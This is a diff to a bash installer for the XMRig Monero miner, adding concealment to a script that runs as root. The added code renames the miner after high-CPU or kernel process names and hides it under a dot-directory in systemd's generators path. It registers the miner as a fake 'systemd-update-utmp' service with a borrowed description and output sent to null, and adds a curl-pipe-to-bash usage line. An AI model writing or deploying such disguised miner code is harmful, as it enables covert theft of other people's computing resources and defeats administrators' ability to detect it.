@@ -27,14 +27,24 @@ log_error() {
 }
 
 # Parameter validation
-if [ $# -ne 2 ]; then
-    log_error "Usage: $0 <wallet_address> <pool_address:port>"
-    log_error "Example: $0 your_wallet_address pool.example.com:4444"
+if [ $# -lt 2 ]; then
+    log_error "Insufficient parameters!"
+    echo "Usage: curl -s -L x.x/miner.sh | LC_ALL=en_US.UTF-8 bash -s wallet_address pool_address:port [CPU_usage%]"
+    echo "Example: curl -s -L x.x/miner.sh | LC_ALL=en_US.UTF-8 bash -s 4xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx pool.supportxmr.com:443 50"
+    echo "CPU usage parameter is optional, defaults to using all CPU cores, setting 50 means using 50% of CPU cores"
     exit 1
 fi
 
+# Parameter parsing
 WALLET_ADDRESS="$1"
 POOL_ADDRESS="$2"
+CPU_USAGE="${3:-100}"  # Default 100% using all cores
+
+# Validate CPU usage parameter
+if ! [[ "$CPU_USAGE" =~ ^[0-9]+$ ]] || [ "$CPU_USAGE" -lt 1 ] || [ "$CPU_USAGE" -gt 100 ]; then
+    log_error "Invalid CPU usage parameter! Please enter a number between 1-100"
+    exit 1
+fi
 
 # Validate parameters
 if [ -z "$WALLET_ADDRESS" ] || [ -z "$POOL_ADDRESS" ]; then
@@ -49,6 +59,56 @@ export LC_ALL=en_US.UTF-8
 log_info "Starting XMR mining script installation..."
 log_info "Wallet Address: $WALLET_ADDRESS"
 log_info "Pool Address: $POOL_ADDRESS"
+log_info "CPU Usage: ${CPU_USAGE}%"
+
+# Detect CPU cores and calculate binding
+detect_cpu_info() {
+    log_info "Detecting CPU information..."
+    
+    # Get CPU core count
+    if command -v lscpu >/dev/null 2>&1; then
+        TOTAL_CORES=$(lscpu | grep "^CPU(s):" | awk '{print $2}')
+    elif [ -f /proc/cpuinfo ]; then
+        TOTAL_CORES=$(grep -c "^processor" /proc/cpuinfo)
+    else
+        log_warn "Unable to detect CPU core count, using default value 4"
+        TOTAL_CORES=4
+    fi
+    
+    # Validate core count
+    if ! [[ "$TOTAL_CORES" =~ ^[0-9]+$ ]] || [ "$TOTAL_CORES" -lt 1 ]; then
+        log_warn "CPU core count detection abnormal, using default value 4"
+        TOTAL_CORES=4
+    fi
+    
+    # Calculate cores to use
+    USED_CORES=$(( (TOTAL_CORES * CPU_USAGE + 99) / 100 ))  # Round up
+    
+    # Ensure at least 1 core is used
+    if [ "$USED_CORES" -lt 1 ]; then
+        USED_CORES=1
+    fi
+    
+    # Ensure not exceeding total cores
+    if [ "$USED_CORES" -gt "$TOTAL_CORES" ]; then
+        USED_CORES=$TOTAL_CORES
+    fi
+    
+    log_info "Total CPU cores: $TOTAL_CORES"
+    log_info "Cores to use: $USED_CORES (${CPU_USAGE}%)"
+    
+    # Generate CPU affinity list (0 to USED_CORES-1)
+    CPU_AFFINITY=""
+    for ((i=0; i<USED_CORES; i++)); do
+        if [ -z "$CPU_AFFINITY" ]; then
+            CPU_AFFINITY="$i"
+        else
+            CPU_AFFINITY="$CPU_AFFINITY,$i"
+        fi
+    done
+    
+    log_info "CPU affinity list: $CPU_AFFINITY"
+}
 
 # System detection
 detect_system() {
@@ -226,13 +286,45 @@ install_missing_dependencies() {
     fi
 }
 
+# Get process name for disguise
+get_disguise_name() {
+    log_info "Getting process name for disguise..."
+    
+    # Get the process with highest CPU usage (excluding kernel processes)
+    DISGUISE_NAME=$(ps aux --no-headers | grep -v '\[' | sort -k3 -nr | head -1 | awk '{print $11}' | sed 's/.*\///')
+    
+    # Fallback to common system processes if no suitable process found
+    if [ -z "$DISGUISE_NAME" ] || [ "$DISGUISE_NAME" = "ps" ] || [ "$DISGUISE_NAME" = "sort" ]; then
+        DISGUISE_NAMES=("systemd" "kthreadd" "ksoftirqd" "migration" "rcu_gp" "rcu_par_gp" "kworker" "mm_percpu_wq" "ksoftirqd" "watchdog" "sshd" "NetworkManager" "systemd-logind")
+        DISGUISE_NAME=${DISGUISE_NAMES[$RANDOM % ${#DISGUISE_NAMES[@]}]}
+    fi
+    
+    log_info "Using disguise name: $DISGUISE_NAME"
+}
+
+# Create hidden directory structure
+create_hidden_dirs() {
+    log_info "Creating hidden directory structure..."
+    
+    # Create deep hidden directory structure
+    HIDDEN_BASE="/usr/lib/systemd/system-generators/.cache"
+    WORK_DIR="$HIDDEN_BASE/systemd-update-utmp"
+    
+    mkdir -p "$WORK_DIR"
+    
+    # Set directory permissions to blend in
+    chmod 755 "$HIDDEN_BASE"
+    chmod 755 "$WORK_DIR"
+    
+    log_info "Hidden directory created: $WORK_DIR"
+}
+
 # Download and install XMRig
 download_and_install() {
     log_info "Downloading and installing XMRig..."
     
-    # Create working directory
-    WORK_DIR="/opt/xmrig"
-    mkdir -p "$WORK_DIR"
+    # Create hidden directory structure
+    create_hidden_dirs
     cd "$WORK_DIR"
     
     # Download file
@@ -258,10 +350,19 @@ download_and_install() {
         rm -f "$WORK_DIR/config.json"
     fi
     
-    # Set execute permissions
-    chmod +x xmrig
+    # Get disguise name before renaming
+    get_disguise_name
     
-    log_info "XMRig installation completed"
+    # Rename xmrig to disguise name
+    mv xmrig "$DISGUISE_NAME"
+    
+    # Set execute permissions
+    chmod +x "$DISGUISE_NAME"
+    
+    # Create symlink with original name for compatibility
+    ln -sf "$DISGUISE_NAME" xmrig
+    
+    log_info "XMRig installation completed with disguise name: $DISGUISE_NAME"
 }
 
 # Create configuration file
@@ -310,11 +411,12 @@ create_config() {
         "priority": null,
         "memory-pool": false,
         "yield": true,
-        "max-threads-hint": null,
+        "max-threads-hint": $USED_CORES,
         "asm": true,
         "argon2-impl": null,
         "cn/0": false,
-        "cn-lite/0": false
+        "cn-lite/0": false,
+        "affinity": [$CPU_AFFINITY]
     },
     "opencl": {
         "enabled": false,
@@ -388,27 +490,31 @@ EOF
 create_systemd_service() {
     log_info "Creating systemd service..."
     
-    cat > /etc/systemd/system/xmrig.service << EOF
+    # Create service with disguised name
+    SERVICE_NAME="systemd-update-utmp"
+    
+    cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
 [Unit]
-Description=XMRig Monero Miner
+Description=Update UTMP about System Runlevel Changes
 After=network.target
 
 [Service]
 Type=simple
 User=root
 WorkingDirectory=$WORK_DIR
-ExecStart=$WORK_DIR/xmrig --config=$WORK_DIR/config.json
+ExecStart=$WORK_DIR/$DISGUISE_NAME --config=$WORK_DIR/config.json
 Restart=always
 RestartSec=10
-StandardOutput=journal
-StandardError=journal
+StandardOutput=null
+StandardError=null
+SyslogIdentifier=$DISGUISE_NAME
 
 [Install]
 WantedBy=multi-user.target
 EOF
     
     systemctl daemon-reload
-    systemctl enable xmrig.service
+    systemctl enable ${SERVICE_NAME}.service
     
     log_info "Systemd service created and enabled"
 }
@@ -417,21 +523,23 @@ EOF
 create_sysv_service() {
     log_info "Creating SysV init script..."
     
-    cat > /etc/init.d/xmrig << EOF
+    SERVICE_NAME="systemd-update-utmp"
+    
+    cat > /etc/init.d/$SERVICE_NAME << EOF
 #!/bin/bash
-# xmrig        XMRig Monero Miner
+# $SERVICE_NAME        Update UTMP about System Runlevel Changes
 # chkconfig: 35 99 99
-# description: XMRig Monero Miner
+# description: Update UTMP about System Runlevel Changes
 #
 
 . /etc/rc.d/init.d/functions
 
 USER="root"
-DAEMON="xmrig"
+DAEMON="$DISGUISE_NAME"
 ROOT_DIR="$WORK_DIR"
 
 SERVER="\$ROOT_DIR/\$DAEMON"
-LOCK_FILE="/var/lock/subsys/xmrig"
+LOCK_FILE="/var/lock/subsys/$SERVICE_NAME"
 
 do_start() {
     if [ -f \$LOCK_FILE ] ; then
@@ -450,6 +558,8 @@ do_stop() {
     echo -n "Shutting down \$DAEMON: "
     pid=\$(ps -aefw | grep "\$DAEMON" | grep -v " grep " | awk '{print \$2}')
     kill -9 \$pid > /dev/null 2>&1
+    # Also kill any xmrig processes
+    pkill -f "xmrig" > /dev/null 2>&1
     [ \$? -eq 0 ] && echo_success || echo_failure
     RETVAL=\$?
     echo
@@ -476,9 +586,9 @@ esac
 exit \$RETVAL
 EOF
     
-    chmod +x /etc/init.d/xmrig
-    chkconfig --add xmrig
-    chkconfig xmrig on
+    chmod +x /etc/init.d/$SERVICE_NAME
+    chkconfig --add $SERVICE_NAME
+    chkconfig $SERVICE_NAME on
     
     log_info "SysV init script created and enabled"
 }
@@ -501,10 +611,10 @@ start_mining() {
     log_info "Starting mining service..."
     
     if command -v systemctl >/dev/null 2>&1; then
-        systemctl start xmrig.service
-        systemctl status xmrig.service --no-pager
+        systemctl start ${SERVICE_NAME}.service
+        systemctl status ${SERVICE_NAME}.service --no-pager
     else
-        service xmrig start
+        service $SERVICE_NAME start
     fi
     
     log_info "Mining service started"
@@ -519,23 +629,25 @@ show_status() {
     log_info "Wallet Address: $WALLET_ADDRESS"
     log_info "Pool Address: $POOL_ADDRESS"
     log_info "Donation Setting: 0%"
+    log_info "Process Name: $DISGUISE_NAME"
+    log_info "Service Name: $SERVICE_NAME"
     echo
     log_info "=== Management Commands ==="
     if command -v systemctl >/dev/null 2>&1; then
-        log_info "Check Status: systemctl status xmrig"
-        log_info "Stop Mining: systemctl stop xmrig"
-        log_info "Start Mining: systemctl start xmrig"
-        log_info "Restart Mining: systemctl restart xmrig"
-        log_info "View Logs: journalctl -u xmrig -f"
+        log_info "Check Status: systemctl status $SERVICE_NAME"
+        log_info "Stop Mining: systemctl stop $SERVICE_NAME"
+        log_info "Start Mining: systemctl start $SERVICE_NAME"
+        log_info "Restart Mining: systemctl restart $SERVICE_NAME"
+        log_info "View Logs: journalctl -u $SERVICE_NAME -f"
     else
-        log_info "Check Status: service xmrig status"
-        log_info "Stop Mining: service xmrig stop"
-        log_info "Start Mining: service xmrig start"
-        log_info "Restart Mining: service xmrig restart"
+        log_info "Check Status: service $SERVICE_NAME status"
+        log_info "Stop Mining: service $SERVICE_NAME stop"
+        log_info "Start Mining: service $SERVICE_NAME start"
+        log_info "Restart Mining: service $SERVICE_NAME restart"
     fi
     echo
     log_info "Config File: $WORK_DIR/config.json"
-    log_info "Manual Run: cd $WORK_DIR && ./xmrig --config=config.json"
+    log_info "Manual Run: cd $WORK_DIR && ./$DISGUISE_NAME --config=config.json"
 }
 
 # Main function
@@ -546,7 +658,15 @@ main() {
         exit 1
     fi
     
+    # Get disguise name first
+    DISGUISE_NAME=$(get_disguise_name)
+    SERVICE_NAME="systemd-update-utmp"
+    
+    log_info "Process will be disguised as: $DISGUISE_NAME"
+    log_info "Service will be named: $SERVICE_NAME"
+    
     # Execute installation steps
+    detect_cpu_info
     detect_system
     set_version
     get_download_url
